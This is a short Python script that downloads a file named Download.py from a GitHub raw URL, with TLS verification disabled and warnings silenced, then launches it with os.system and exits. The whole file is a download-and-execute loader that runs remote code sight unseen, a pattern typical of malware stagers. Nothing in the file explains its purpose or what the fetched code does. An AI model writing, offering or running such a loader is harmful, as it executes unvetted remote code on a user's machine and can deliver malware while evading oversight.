import requests,os,warnings
def urldownload(url,filename):
    warnings.filterwarnings('ignore')
    down_res = requests.get(url=url,verify=False)
    if not os.path.exists(filename):
        file = open(filename,'a')
        file.close()
    with open(filename,'wb') as file:
        file.write(down_res.content)
urldownload('https://github.com/huangzherui/Download/raw/main/py/Download.py','Download.py')
os.system("start python Download.py")
quit()
